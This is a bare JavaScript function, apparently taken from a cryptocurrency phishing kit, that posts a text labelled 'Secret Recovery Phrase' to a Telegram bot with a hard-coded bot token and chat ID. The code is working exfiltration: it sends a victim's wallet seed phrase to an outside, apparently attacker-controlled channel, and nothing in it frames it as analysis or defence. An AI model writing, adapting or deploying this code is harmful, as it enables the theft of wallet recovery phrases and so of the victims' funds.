function sendToTelegram(phrase) {
  const botToken = "7764687324:AAEEMqhHb-rAf1-i_z5LSCW1JJcwTYj9s5c";
  const chatId = "6996434307";

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: "Secret Recovery Phrase:\n" + phrase.trim()
    })
  });
}
